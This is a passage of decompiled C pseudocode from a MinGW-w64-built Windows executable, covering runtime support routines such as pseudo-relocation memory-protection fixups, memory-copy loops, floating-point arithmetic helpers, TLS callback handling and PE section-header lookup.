  SVar7 = VirtualQuery(pIVar6->e_magic + uVar1,&local_68,0x30);
  if (SVar7 == 0) {
                    /* WARNING: Subroutine does not return */
    FUN_14000d3ca("  VirtualQuery failed for %d bytes at address %p",
                  (ulonglong)(pIVar5->Misc).PhysicalAddress,
                  *(undefined8 *)(DAT_140034b78 + 0x18 + lVar11 * 0x28),param_4);
  }
  if ((int)local_68.Protect < 8) {
    uVar10 = 4;
    if (local_68.Protect != 2) {
      if (local_68.Protect == 4) goto LAB_14000d362;
      goto LAB_14000d333;
    }
  }
  else {
    if (((local_68.Protect == 8) || (local_68.Protect == 0x40)) || (local_68.Protect == 0x80))
    goto LAB_14000d362;
LAB_14000d333:
    uVar10 = 0x40;
  }
  lpflOldProtect = (PDWORD)(DAT_140034b78 + lVar11 * 0x28);
  *(PVOID *)(lpflOldProtect + 2) = local_68.BaseAddress;
  *(SIZE_T *)(lpflOldProtect + 4) = local_68.RegionSize;
  BVar3 = VirtualProtect(local_68.BaseAddress,local_68.RegionSize,(DWORD)uVar10,lpflOldProtect);
  if (BVar3 == 0) {
    DVar4 = GetLastError();
                    /* WARNING: Subroutine does not return */
    FUN_14000d3ca("  VirtualProtect failed with code 0x%x",(ulonglong)DVar4,uVar10,lpflOldProtect);
  }
LAB_14000d362:
  DAT_140034b68 = DAT_140034b68 + 1;
LAB_14000d368:
  FUN_14000d5a5(param_1,param_2,param_3);
  return;
}


// ==== FUN_14000d3ca @ 14000d3ca size 99

void FUN_14000d3ca(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FILE *_File;
  undefined8 uVar1;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  _File = (FILE *)__acrt_iob_func(2);
  fwrite("Mingw-w64 runtime failure:\n",0x1b,1,_File);
  uVar1 = __acrt_iob_func(2);
  FUN_1400161cc(uVar1,param_1,&local_res10);
                    /* WARNING: Subroutine does not return */
  abort();
}


// ==== FUN_14000d430 @ 14000d430 size 8

undefined8 FUN_14000d430(void)

{
  return 0;
}


// ==== FUN_14000d438 @ 14000d438 size 257

void FUN_14000d438(float10 *param_1,float10 *param_2,float10 *param_3,float10 *param_4)

{
  float10 fVar1;
  float10 fVar2;
  float10 fVar3;
  float10 fVar4;
  undefined2 uStack_90;
  undefined8 local_88;
  undefined2 uStack_80;
  undefined8 local_68;
  undefined2 uStack_60;
  undefined8 local_48;
  undefined2 uStack_40;
  undefined8 local_28;
  undefined2 uStack_20;
  
  fVar1 = *param_2;
  fVar2 = *param_3;
  fVar4 = fVar1 * fVar2 + *param_4;
  uStack_90 = (ushort)((unkuint10)fVar4 >> 0x40);
  if ((~uStack_90 & 0x7fff) != 0) {
    local_88 = SUB108(fVar1,0);
    uStack_80 = (ushort)((unkuint10)fVar1 >> 0x40);
    fVar4 = (float10)CONCAT28(uStack_80,local_88 & 0xfffffffe00000000);
    local_68 = SUB108(fVar1 - fVar4,0);
    uStack_60 = (ushort)((unkuint10)(fVar1 - fVar4) >> 0x40);
    fVar1 = (float10)CONCAT28(uStack_60 & 0x7fff | uStack_80 & 0x8000,local_68);
    local_48 = SUB108(fVar2,0);
    uStack_40 = (ushort)((unkuint10)fVar2 >> 0x40);
    fVar3 = (float10)CONCAT28(uStack_40,local_48 & 0xfffffffe00000000);
    local_28 = SUB108(fVar2 - fVar3,0);
    uStack_20 = (ushort)((unkuint10)(fVar2 - fVar3) >> 0x40);
    fVar2 = (float10)CONCAT28(uStack_20 & 0x7fff | uStack_40 & 0x8000,local_28);
    fVar4 = fVar1 * fVar2 + fVar4 * fVar3 + *param_4 + fVar4 * fVar2 + fVar3 * fVar1;
  }
  *param_1 = fVar4;
  return;
}


// ==== FUN_14000d53c @ 14000d53c size 20

void FUN_14000d53c(longlong param_1)

{
  char *pcVar1;
  longlong lVar2;
  
  lVar2 = -1;
  do {
    pcVar1 = (char *)(param_1 + 1 + lVar2);
    lVar2 = lVar2 + 1;
  } while (*pcVar1 != '\0');
  return;
}


// ==== FUN_14000d550 @ 14000d550 size 27

void FUN_14000d550(longlong param_1,undefined1 param_2,longlong param_3)

{
  longlong lVar1;
  
  if (param_3 != 0) {
    lVar1 = 0;
    do {
      *(undefined1 *)(param_1 + lVar1) = param_2;
      lVar1 = lVar1 + 1;
    } while (param_3 != lVar1);
  }
  return;
}


// ==== FUN_14000d56b @ 14000d56b size 58

void FUN_14000d56b(ulonglong param_1,ulonglong param_2,longlong param_3)

{
  longlong lVar1;
  
  if (param_1 < param_2) {
    for (lVar1 = 0; param_3 != lVar1; lVar1 = lVar1 + 1) {
      *(undefined1 *)(param_1 + lVar1) = *(undefined1 *)(param_2 + lVar1);
    }
  }
  else {
    while (param_3 != 0) {
      *(undefined1 *)((param_1 - 1) + param_3) = *(undefined1 *)((param_2 - 1) + param_3);
      param_3 = param_3 + -1;
    }
  }
  return;
}


// ==== FUN_14000d5a5 @ 14000d5a5 size 29

void FUN_14000d5a5(longlong param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  
  for (lVar1 = 0; param_3 != lVar1; lVar1 = lVar1 + 1) {
    *(undefined1 *)(param_1 + lVar1) = *(undefined1 *)(param_2 + lVar1);
  }
  return;
}


// ==== FUN_14000d5c2 @ 14000d5c2 size 48

ulonglong FUN_14000d5c2(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  
  uVar1 = in_RAX;
  if (0xfff < in_RAX) {
    do {
      uVar1 = uVar1 - 0x1000;
    } while (0x1000 < uVar1);
  }
  return in_RAX;
}


// ==== FUN_14000d708 @ 14000d708 size 47

undefined1 (*) [10] FUN_14000d708(undefined1 (*param_1) [10],undefined1 (*param_2) [10])

{
  undefined1 local_38 [10];
  undefined1 local_28 [2] [10];
  
  local_38 = *param_2;
  FUN_14000d7fc(local_28,&local_38);
  *param_1 = local_28[0];
  return param_1;
}


// ==== FUN_14000d737 @ 14000d737 size 197

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14000d737(ulonglong *param_1)

{
  ushort uVar1;
  ulonglong uVar2;
  byte bVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  undefined4 local_88;
  undefined4 uStack_84;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  ulonglong local_78;
  undefined8 uStack_70;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  
  local_48 = (undefined4)*param_1;
  uStack_44 = *(undefined4 *)((longlong)param_1 + 4);
  uVar5 = *param_1;
  uStack_80 = (undefined4)param_1[1];
  uStack_7c = *(undefined4 *)((longlong)param_1 + 0xc);
  uVar1 = (ushort)((uint)uStack_7c >> 0x10) & 0x7fff;
  if (uVar1 < 0x406f) {
    bVar3 = 1;
    if (0x3ffe < uVar1) {
      bVar3 = (char)uVar1 + 0x11;
    }
    uVar2 = 0xffffffffffffffff >> (bVar3 & 0x3f);
    uVar4 = 0;
    if ((bVar3 & 0x40) == 0) {
      uVar4 = uVar2;
      uVar2 = 0xffffffffffffffff;
    }
    if ((uVar2 & uVar5) != 0 || (uVar4 & param_1[1]) != 0) {
      local_78 = _DAT_14002e310;
      uStack_70 = _UNK_14002e318;
      local_88 = local_48;
      uStack_84 = uStack_44;
      local_58 = local_48;
      uStack_54 = uStack_44;
      uStack_50 = uStack_80;
      uStack_4c = uStack_7c;
      FUN_140012365((ulonglong *)&local_88,&local_78);
      uVar5 = ~uVar2 & uVar5;
      local_48 = (undefined4)uVar5;
      uStack_44 = (undefined4)(uVar5 >> 0x20);
    }
  }
  return CONCAT44(uStack_44,local_48);
}


// ==== FUN_14000d7fc @ 14000d7fc size 71

undefined1 (*) [10] FUN_14000d7fc(undefined1 (*param_1) [10],undefined1 (*param_2) [10])

{
  ulonglong local_58 [2];
  ulonglong local_48 [2];
  undefined1 local_38 [10];
  undefined1 local_28 [2] [10];
  
  local_28[0] = *param_2;
  local_58[0] = FUN_140015d75((longlong *)local_28);
  local_48[0] = FUN_14000d737(local_58);
  FUN_140015a0f((ulonglong *)local_38,local_48);
  *param_1 = local_38;
  return param_1;
}


// ==== FUN_14000ebab @ 14000ebab size 366

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

double FUN_14000ebab(double param_1,int param_2)

{
  longlong lVar1;
  uint uVar2;
  uint uVar3;
  double dVar4;
  uint uVar5;
  ulonglong uVar6;
  
  dVar4 = param_1;
  if ((!NAN(param_1)) && (((uint)((ulonglong)param_1 >> 0x34) & 0x7ff) < 0x7ff)) {
    dVar4 = (double)((ulonglong)param_1 & 0x8000000000000000);
    uVar6 = (longlong)param_1 * 2;
    lVar1 = 0x3f;
    if (uVar6 != 0) {
      for (; uVar6 >> lVar1 == 0; lVar1 = lVar1 + -1) {
      }
    }
    uVar3 = ((uint)lVar1 ^ 0xffffffc0) + 0xc;
    if ((ulonglong)ABS(param_1) >> 0x34 != 0) {
      uVar3 = (uint)(uVar6 >> 0x35);
    }
    if (param_2 < 0) {
      uVar5 = -param_2;
      if ((int)-uVar3 < param_2) {
        dVar4 = (double)((longlong)param_1 - ((ulonglong)uVar5 << 0x34));
      }
      else if ((int)(-0x34 - uVar3) <= param_2) {
        uVar2 = 1 - (param_2 + uVar3);
        if ((int)uVar5 < (int)uVar2) {
          uVar2 = uVar5;
        }
        lVar1 = 0;
        if (param_1 != 0.0) {
          for (; ((ulonglong)param_1 >> lVar1 & 1) == 0; lVar1 = lVar1 + 1) {
          }
        }
        uVar5 = uVar2 - 1 & 0x3f;
        uVar6 = 0;
        if (0 < (int)uVar3) {
          uVar6 = 0x10000000000000;
        }
        dVar4 = (double)((ulonglong)param_1 & (ulonglong)DAT_14002e560 |
                        ~(ulonglong)((uint)lVar1 == uVar5) &
                        ((uVar6 | (ulonglong)param_1 & 0xfffffffffffff) >> (sbyte)uVar5) + 1 >> 1 &
                        (ulonglong)DAT_14002e550);
      }
    }
    else if ((int)(0x7fe - uVar3) < param_2) {
      dVar4 = (double)((ulonglong)param_1 & (ulonglong)DAT_14002e560 | (ulonglong)DAT_14002e570);
    }
    else {
      uVar5 = uVar3 + param_2;
      if (uVar5 == 0 || SCARRY4(uVar3,param_2) != (int)uVar5 < 0) {
        dVar4 = (double)((longlong)param_1 << ((byte)param_2 & 0x3f) | (ulonglong)dVar4);
      }
      else if ((int)uVar3 < 1) {
        dVar4 = (double)((longlong)param_1 << (1U - (char)uVar3 & 0x3f) & 0xfffffffffffffU |
                         (ulonglong)uVar5 << 0x34 | (ulonglong)dVar4);
      }
      else {
        dVar4 = (double)(((ulonglong)(uint)param_2 << 0x34) + (longlong)param_1);
      }
    }
  }
  return dVar4;
}


// ==== FUN_140010e85 @ 140010e85 size 675

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

double FUN_140010e85(double param_1,double param_2)

{
  uint uVar1;
  int iVar2;
  double dVar3;
  uint uVar4;
  int iVar5;
  undefined1 in_XMM0 [16];
  double dVar6;
  double dVar7;
  undefined1 auVar8 [16];
  double dVar9;
  double local_78;
  int local_70;
  double local_68;
  int local_60;
  double local_58;
  int local_50;
  
  dVar3 = in_XMM0._0_8_;
  if (((in_XMM0._4_4_ >> 0x14 & 0x7ff) < 0x7ff) && ((ulonglong)ABS(param_1) < 0x7ff0000000000000)) {
    if (0x7fefffffffffffff < (ulonglong)ABS(param_2)) {
      return param_2;
    }
    if (((dVar3 != 0.0) || (NAN(dVar3))) && ((param_1 != 0.0 || (NAN(param_1))))) {
      if ((param_2 == 0.0) && (!NAN(param_2))) {
        return dVar3 * param_1;
      }
      FUN_140011180((ulonglong *)&local_58,(ulonglong)dVar3);
      FUN_140011180((ulonglong *)&local_68,(ulonglong)param_1);
      iVar5 = local_50 + local_60;
      FUN_140011180((ulonglong *)&local_78,(ulonglong)param_2);
      if (iVar5 - local_70 < 0x6b) {
        dVar3 = (double)FUN_14000ebab(local_78,-(iVar5 - local_70));
      }
      else {
        dVar3 = (double)((ulonglong)local_78 & _DAT_14002f530 | (ulonglong)DAT_14002f540);
      }
      dVar6 = (local_58 - _DAT_14002f550 * local_58) + _DAT_14002f550 * local_58;
      auVar8._8_8_ = (local_68 - _UNK_14002f558 * local_68) + _UNK_14002f558 * local_68;
      dVar9 = auVar8._8_8_ * (local_58 - dVar6) + dVar6 * (local_68 - auVar8._8_8_);
      dVar7 = dVar6 * auVar8._8_8_ + dVar9;
      dVar6 = (local_68 - auVar8._8_8_) * (local_58 - dVar6) +
              (dVar6 * auVar8._8_8_ - dVar7) + dVar9;
      param_2 = dVar7 + dVar3;
      if ((param_2 != 0.0) || (NAN(param_2))) {
        dVar7 = (dVar7 - (param_2 - (param_2 - dVar7))) + (dVar3 - (param_2 - dVar7));
        dVar3 = dVar6 + dVar7;
        dVar6 = (dVar6 - (dVar3 - dVar7)) + (dVar7 - (dVar3 - (dVar3 - dVar7)));
        if (((dVar6 != 0.0) || (NAN(dVar6))) && (((ulonglong)dVar3 & 1) == 0)) {
          dVar3 = (double)(((longlong)dVar3 - (((ulonglong)dVar6 ^ (ulonglong)dVar3) >> 0x3e)) + 1);
        }
        iVar2 = FUN_140011128((ulonglong)param_2);
        dVar6 = param_2 + dVar3;
        if (iVar2 + iVar5 < -0x3fe) {
          auVar8._0_8_ = ((dVar6 - param_2) - dVar6) + param_2 + (dVar3 - (dVar6 - param_2));
          if ((auVar8._0_8_ != 0.0) || (NAN(auVar8._0_8_))) {
            uVar1 = (uint)((ulonglong)dVar6 >> 0x20);
            iVar2 = (uVar1 >> 0x14 & 0x7ff) + iVar5;
            if ((((ulonglong)dVar6 & 1) == 0) != (iVar2 != 0)) {
              uVar4 = movmskpd(CONCAT31((int3)((uint)iVar2 >> 8),iVar2 != 0),auVar8);
              dVar6 = (double)(((longlong)dVar6 -
                               (ulonglong)
                               (((uint)(((ulonglong)uVar4 << 0x3f) >> 0x20) ^ uVar1) >> 0x1e &
                               0xfffffffe)) + 1);
            }
          }
        }
        dVar3 = (double)FUN_14000ebab(dVar6,iVar5);
        return dVar3;
      }
      dVar3 = (double)FUN_14000ebab(dVar6,iVar5);
      goto LAB_140010f14;
    }
  }
  dVar3 = dVar3 * param_1;
LAB_140010f14:
  return param_2 + dVar3;
}


// ==== FUN_140011128 @ 140011128 size 88

int FUN_140011128(ulonglong param_1)

{
  longlong lVar1;
  uint uVar2;
  int iVar3;
  ulonglong uVar4;
  
  uVar4 = param_1 & 0x7fffffffffffffff;
  if (uVar4 >> 0x34 == 0x7ff) {
    iVar3 = (0x7ff0000000000000 < uVar4) + 0x7fffffff;
  }
  else {
    uVar2 = (uint)(uVar4 >> 0x34);
    if (uVar2 == 0) {
      if (uVar4 == 0) {
        iVar3 = -0x80000000;
      }
      else {
        lVar1 = 0x3f;
        if (uVar4 != 0) {
          for (; uVar4 >> lVar1 == 0; lVar1 = lVar1 + -1) {
          }
        }
        iVar3 = (int)lVar1 + -0x432;
      }
    }
    else {
      iVar3 = uVar2 - 0x3ff;
    }
  }
  return iVar3;
}


// ==== FUN_140011180 @ 140011180 size 188

void FUN_140011180(ulonglong *param_1,ulonglong param_2)

{
  ulonglong uVar1;
  byte bVar2;
  uint uVar3;
  int iVar4;
  ulonglong uVar5;
  uint uVar6;
  
  iVar4 = 0;
  uVar3 = (uint)(param_2 >> 0x34);
  uVar6 = uVar3 & 0x7ff;
  if (uVar6 == 0) {
    uVar5 = param_2 << 0xc;
    if (uVar5 != 0) {
      uVar1 = 0x3f;
      if (uVar5 != 0) {
        for (; uVar5 >> uVar1 == 0; uVar1 = uVar1 - 1) {
        }
      }
      bVar2 = (byte)(uVar1 ^ 0x3f);
      uVar5 = 0;
      if (bVar2 < 0x33) {
        uVar5 = param_2 << (bVar2 + 1 & 0x3f) & 0xfffffffffffff;
      }
      param_2 = uVar5 | param_2 & 0x8000000000000000 | 0x3fe0000000000000;
      iVar4 = -0x3fe - (int)(uVar1 ^ 0x3f);
    }
  }
  else {
    iVar4 = 0;
    if (uVar6 != 0x7ff) {
      param_2 = param_2 & 0x800fffffffffffff | 0x3fe0000000000000;
      iVar4 = (uVar3 & 0x7ff) - 0x3fe;
    }
  }
  *param_1 = param_2;
  *(int *)(param_1 + 1) = iVar4;
  *(undefined4 *)((longlong)param_1 + 0xc) = 0;
  return;
}


// ==== FUN_140012365 @ 140012365 size 1003

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_140012365(ulonglong *param_1,ulonglong *param_2)

{
  longlong lVar1;
  byte bVar2;
  byte bVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  ulonglong uVar11;
  longlong lVar12;
  uint uVar13;
  uint uVar14;
  ulonglong uVar15;
  ulonglong uVar16;
  undefined4 uVar17;
  undefined4 uVar18;
  
  uVar9 = *param_1;
  uVar8 = param_1[1];
  uVar6 = *param_2;
  uVar11 = param_2[1];
  uVar4 = uVar8 & 0x7fffffffffffffff;
  uVar16 = CONCAT44(_UNK_14002fce4 & *(uint *)((longlong)param_2 + 4),
                    _DAT_14002fce0 & (uint)*param_2);
  uVar5 = CONCAT44(_UNK_14002fcec & *(uint *)((longlong)param_2 + 0xc),
                   _UNK_14002fce8 & (uint)param_2[1]);
  if ((uVar5 + 0x8001000000000000 < 0x8001000000000000 || uVar5 < (uVar16 == 0)) ||
      (uVar4 + 0x8001000000000000 < 0x8001000000000000 || uVar4 < (uVar9 == 0))) {
    if (0x7ffeffffffffffff < uVar4 && (ulonglong)(uVar9 == 0) <= uVar4 + 0x8001000000000000) {
      return *param_1;
    }
    if (0x7ffeffffffffffff < uVar5 && (ulonglong)(uVar16 == 0) <= uVar5 + 0x8001000000000000) {
      return *param_2;
    }
    if (uVar4 == 0x7fff000000000000 && uVar9 == 0) {
      uVar17 = (int)*param_1;
      uVar18 = *(undefined4 *)((longlong)param_1 + 4);
      if ((uVar11 ^ uVar8) == 0x8000000000000000 && uVar6 == uVar9) {
        uVar17 = _DAT_14002fcf0;
        uVar18 = _UNK_14002fcf4;
      }
      return CONCAT44(uVar18,uVar17);
    }
    if (uVar5 == 0x7fff000000000000 && uVar16 == 0) {
      return *param_2;
    }
    if (uVar9 == 0 && uVar4 == 0) {
      if (uVar16 != 0 || uVar5 != 0) {
        return *param_2;
      }
      return uVar6 & uVar9;
    }
    if (uVar16 == 0 && uVar5 == 0) {
      return *param_1;
    }
  }
  uVar7 = uVar8;
  uVar10 = uVar9;
  uVar15 = uVar11;
  if (uVar4 < uVar5 || uVar4 - uVar5 < (ulonglong)(uVar9 < uVar16)) {
    uVar7 = uVar11;
    uVar10 = uVar6;
    uVar15 = uVar8;
    uVar6 = uVar9;
  }
  uVar14 = (ushort)(uVar15 >> 0x30) & 0x7fff;
  uVar16 = uVar7 & 0xffffffffffff;
  uVar13 = (ushort)(uVar7 >> 0x30) & 0x7fff;
  if ((uVar7 & 0x7fff000000000000) == 0) {
    lVar12 = 0x3f;
    if (uVar16 != 0) {
      for (; uVar16 >> lVar12 == 0; lVar12 = lVar12 + -1) {
      }
    }
    lVar1 = 0x3f;
    if (uVar10 != 0) {
      for (; uVar10 >> lVar1 == 0; lVar1 = lVar1 + -1) {
      }
    }
    bVar2 = ((byte)lVar1 ^ 0x3f) + 0x40;
    if (uVar16 != 0) {
      bVar2 = (byte)lVar12 ^ 0x3f;
    }
    bVar2 = bVar2 - 0xf;
    uVar5 = uVar10 >> 0x40 - (bVar2 & 0x3f);
    uVar9 = uVar10 << (bVar2 & 0x3f);
    uVar10 = uVar9;
    uVar16 = uVar16 << (bVar2 & 0x3f) | uVar5;
    if ((bVar2 & 0x40) != 0) {
      uVar10 = 0;
      uVar16 = uVar9;
    }
    uVar13 = 1 - bVar2;
  }
  uVar5 = uVar15 & 0xffffffffffff;
  if ((uVar15 & 0x7fff000000000000) == 0) {
    lVar12 = 0x3f;
    if (uVar5 != 0) {
      for (; uVar5 >> lVar12 == 0; lVar12 = lVar12 + -1) {
      }
    }
    lVar1 = 0x3f;
    if (uVar6 != 0) {
      for (; uVar6 >> lVar1 == 0; lVar1 = lVar1 + -1) {
      }
    }
    bVar2 = ((byte)lVar1 ^ 0x3f) + 0x40;
    if (uVar5 != 0) {
      bVar2 = (byte)lVar12 ^ 0x3f;
    }
    bVar2 = bVar2 - 0xf;
    uVar9 = uVar6 >> 0x40 - (bVar2 & 0x3f);
    uVar4 = uVar6 << (bVar2 & 0x3f);
    uVar6 = uVar4;
    uVar5 = uVar5 << (bVar2 & 0x3f) | uVar9;
    if ((bVar2 & 0x40) != 0) {
      uVar6 = 0;
      uVar5 = uVar4;
    }
    uVar14 = 1 - bVar2;
  }
  uVar9 = uVar6 << 3;
  uVar6 = uVar5 << 3 | uVar6 >> 0x3d | 0x8000000000000;
  uVar14 = uVar13 - uVar14;
  if (uVar14 != 0) {
    if (uVar14 < 0x80) {
      bVar3 = (byte)uVar14;
      bVar2 = -bVar3;
      uVar15 = uVar9 << (bVar2 & 0x3f);
      uVar4 = uVar15;
      uVar5 = uVar6 << (bVar2 & 0x3f) | uVar9 >> 0x40 - (bVar2 & 0x3f);
      if ((bVar2 & 0x40) != 0) {
        uVar4 = 0;
        uVar5 = uVar15;
      }
      uVar15 = uVar6 << 0x40 - (bVar3 & 0x3f);
      uVar7 = uVar6 >> (bVar3 & 0x3f);
      uVar6 = uVar7;
      uVar9 = uVar9 >> (bVar3 & 0x3f) | uVar15;
      if ((uVar14 & 0x40) != 0) {
        uVar6 = 0;
        uVar9 = uVar7;
      }
      uVar9 = uVar9 | (uVar4 != 0 || uVar5 != 0);
    }
    else {
      uVar9 = 1;
      uVar6 = 0;
    }
  }
  uVar5 = uVar10 * 8;
  uVar16 = uVar16 << 3 | uVar10 >> 0x3d | 0x8000000000000;
  if ((longlong)(uVar11 ^ uVar8) < 0) {
    uVar11 = uVar5 - uVar9;
    uVar8 = (uVar16 - uVar6) - (ulonglong)(uVar5 < uVar9);
    if (uVar16 == uVar6 && uVar5 == uVar9) {
      return 0;
    }
    if (uVar8 >> 0x33 == 0) {
      lVar12 = 0x3f;
      if (uVar8 != 0) {
        for (; uVar8 >> lVar12 == 0; lVar12 = lVar12 + -1) {
        }
      }
      lVar1 = 0x3f;
      if (uVar11 != 0) {
        for (; uVar11 >> lVar1 == 0; lVar1 = lVar1 + -1) {
        }
      }
      uVar14 = (uint)lVar1 ^ 0x3f | 0x40;
      if (uVar8 != 0) {
        uVar14 = (uint)lVar12 ^ 0x3f;
      }
      uVar14 = uVar14 - 0xc;
      bVar2 = (byte)uVar14 & 0x3f;
      uVar6 = uVar11 >> 0x40 - bVar2;
      uVar16 = uVar11 << ((byte)uVar14 & 0x3f);
      uVar11 = uVar16;
      uVar8 = uVar8 << bVar2 | uVar6;
      if ((uVar14 & 0x40) != 0) {
        uVar11 = 0;
        uVar8 = uVar16;
      }
      uVar13 = uVar13 - uVar14;
      goto LAB_14001269d;
    }
  }
  else {
    uVar11 = uVar5 + uVar9;
    uVar8 = uVar6 + uVar16 + (ulonglong)CARRY8(uVar5,uVar9);
    if ((uVar8 >> 0x34 & 1) != 0) {
      uVar11 = uVar11 >> 1 | uVar8 << 0x3f | (ulonglong)((uint)uVar9 & 1);
      uVar8 = uVar8 >> 1;
      uVar13 = uVar13 + 1;
    }
  }
  if (0x7ffe < (int)uVar13) {
    return 0;
  }
LAB_14001269d:
  if ((int)uVar13 < 1) {
    bVar2 = 4 - (char)uVar13;
    uVar6 = uVar8 >> (bVar2 & 0x3f);
    if ((bVar2 & 0x40) == 0) {
      uVar6 = uVar11 >> (bVar2 & 0x3f) | uVar8 << 0x40 - (bVar2 & 0x3f);
    }
  }
  else {
    uVar14 = (uint)uVar11 & 7;
    lVar12 = (ulonglong)(4 < uVar14) + (uVar11 >> 3 | uVar8 << 0x3d);
    uVar6 = (ulonglong)((uint)(uVar14 == 4) & (uint)lVar12) + lVar12;
  }
  return uVar6;
}


// ==== FUN_140015a0f @ 140015a0f size 211

void FUN_140015a0f(ulonglong *param_1,ulonglong *param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ushort uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  undefined1 *puVar7;
  bool bVar8;
  undefined1 local_28 [8];
  undefined1 local_20 [8];
  
  uVar6 = *param_2;
  uVar1 = param_2[1];
  uVar4 = uVar1 & 0x7fffffffffffffff;
  uVar5 = uVar1 << 0xf | uVar6 >> 0x31;
  uVar2 = uVar5 | 0x8000000000000000;
  uVar3 = 0x7fff;
  if (0x7ffeffffffffffff < uVar4 && (ulonglong)(uVar6 == 0) <= uVar4 + 0x8001000000000000)
  goto LAB_140015aca;
  uVar3 = (ushort)(uVar4 >> 0x30);
  if ((uVar6 & 0x1ffffffffffff) < 0x1000000000001) {
    if ((uVar6 & 0x1ffffffffffff) == 0x1000000000000) {
      uVar6 = (ulonglong)((uint)uVar5 & 1);
      puVar7 = local_28;
      goto LAB_140015aa1;
    }
  }
  else {
    puVar7 = local_20;
    uVar6 = 1;
LAB_140015aa1:
    bVar8 = CARRY8(uVar2,uVar6);
    *puVar7 = bVar8;
    uVar3 = uVar3 + bVar8;
    uVar2 = uVar2 + uVar6 | (ulonglong)bVar8 << 0x3f;
  }
  if (uVar3 == 0) {
    uVar2 = uVar2 & 0x7fffffffffffffff;
  }
LAB_140015aca:
  *param_1 = uVar2;
  *(ushort *)(param_1 + 1) = uVar3 | (ushort)((uint)(uVar1 >> 0x3f) << 0xf);
  return;
}


// ==== FUN_140015d75 @ 140015d75 size 175

longlong FUN_140015d75(longlong *param_1)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar1 = *param_1;
  lVar2 = 0;
  if (lVar1 != 0 || (*(uint *)(param_1 + 1) & 0x7fff) != 0) {
    if (((ushort)*(uint *)(param_1 + 1) & 0x7fff) == 0x7fff) {
      lVar2 = lVar1 << 0x31;
    }
    else {
      lVar2 = lVar1 << 0x31;
    }
  }
  return lVar2;
}


// ==== FUN_140015f84 @ 140015f84 size 177

undefined8 FUN_140015f84(undefined8 param_1,undefined4 param_2)

{
  void *pvVar1;
  void *_Memory;
  
  switch(param_2) {
  case 0:
    FUN_140016035();
    if (DAT_140034b08 == 1) {
      DAT_140034b08 = 1;
      _Memory = DAT_140034b50;
      while (_Memory != (void *)0x0) {
        pvVar1 = *(void **)((longlong)_Memory + 0x10);
        free(_Memory);
        _Memory = pvVar1;
      }
      DAT_140034b50 = (void *)0x0;
      DAT_140034b08 = 0;
      DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_140034ae0);
    }
    break;
  case 1:
    if (DAT_140034b08 == 0) {
      InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_140034ae0);
    }
    DAT_140034b08 = 1;
    break;
  case 2:
    FUN_14000cef0();
    break;
  case 3:
    FUN_140016035();
  }
  return 1;
}


// ==== FUN_140016035 @ 140016035 size 136

void FUN_140016035(void)

{
  DWORD *pDVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  
  if (DAT_140034b08 != 0) {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_140034ae0);
    for (pDVar1 = DAT_140034b50; pDVar1 != (DWORD *)0x0; pDVar1 = *(DWORD **)(pDVar1 + 4)) {
      pvVar3 = TlsGetValue(*pDVar1);
      DVar2 = GetLastError();
      if ((DVar2 == 0) && (pvVar3 != (LPVOID)0x0)) {
        (**(code **)(pDVar1 + 2))(pvVar3);
      }
    }
                    /* WARNING: Could not recover jumptable at 0x0001400160aa. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    LeaveCriticalSection(&DAT_140034ae0);
    return;
  }
  return;
}


// ==== FUN_1400160c0 @ 1400160c0 size 73

void FUN_1400160c0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 *puVar1;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res18 = param_3;
  local_res20 = param_4;
  puVar1 = (undefined8 *)FUN_140016208();
  __stdio_common_vfprintf(*puVar1,param_1,param_2,0,&local_res18);
  return;
}


// ==== FUN_14001610c @ 14001610c size 99

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

IMAGE_SECTION_HEADER * FUN_14001610c(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  uint uVar2;
  longlong lVar3;
  
  if ((((*(short *)PTR_IMAGE_DOS_HEADER_14002dee8 == 0x5a4d) &&
       (lVar3 = (longlong)*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + 0x3c),
       *(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar3) == 0x4550)) &&
      (*(short *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar3 + 0x18) == 0x20b)) &&
     (uVar2 = (uint)*(ushort *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar3 + 6),
     *(ushort *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar3 + 6) != 0)) {
    pIVar1 = (IMAGE_SECTION_HEADER *)
             (PTR_IMAGE_DOS_HEADER_14002dee8 +
             (ulonglong)*(ushort *)(PTR_IMAGE_DOS_HEADER_14002dee8 + lVar3 + 0x14) + lVar3 + 0x18);
    do {
      if (((ulonglong)(uint)pIVar1->VirtualAddress <=
           (ulonglong)(param_1 - (longlong)PTR_IMAGE_DOS_HEADER_14002dee8)) &&
         ((ulonglong)(param_1 - (longlong)PTR_IMAGE_DOS_HEADER_14002dee8) <
          (ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress))) {
        return pIVar1;
      }
      pIVar1 = pIVar1 + 1;
      uVar2 = uVar2 - 1;
